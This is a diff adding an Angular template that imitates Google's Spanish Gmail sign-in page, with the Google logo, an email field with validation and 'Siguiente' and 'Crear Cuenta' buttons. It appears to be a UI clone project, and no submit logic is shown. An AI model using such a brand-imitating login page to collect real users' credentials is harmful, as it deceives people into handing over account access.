@@ -1,0 +1,50 @@
+<form [formGroup]="formLogin" (ngSubmit)="onSubmit()" class="container">
+    <div class="top-content">
+        <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
+        <h2>Inicia sesión</h2>
+        <p class="heading">Ir a Gmail</p>
+
+    </div>
+    <div class="inputs">
+        <!--input type="email" name="" id="email" class="input"-->
+        <!--label for="email" class="input-label">Email or phone</label-->
+        <mat-form-field [hideRequiredMarker]="true" appearance="outline" class="full-width">
+            <mat-label>Correo electrónico o teléfono</mat-label>
+            <input type="email" matInput formControlName="email">
+            <mat-error *ngIf="handleError('email', 'required')">
+                Este campo es requerido
+            </mat-error>
+            <mat-error *ngIf="handleError('email', 'email')">
+                Debes ingresar un correo electrónico válido
+            </mat-error>
+        </mat-form-field>
+    </div>
+    <a href="" class="link-btn">¿Has olvidado tu correo electrónico?</a>
+    <p class="color">¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada.
+        <a href="" style="display:inline;">Más información</a>
+    </p>
+
+    <div class="btn-group">
+        <button class="create-btn">Crear Cuenta</button>
+        <button type="submit" class="next-btn">Siguiente</button>
+    </div>
+
+</form>
+<!--footer>
+    <div class="">
+
+    </div>
+    <div class="footer-list">
+        <ul>
+            <li>
+                <a href="">Ayuda</a>
+            </li>
+            <li>
+                <a href="">Privacidad</a>
+            </li>
+            <li>
+                <a href="">Términos</a>
+            </li>
+        </ul>
+    </div>
+</footer-->
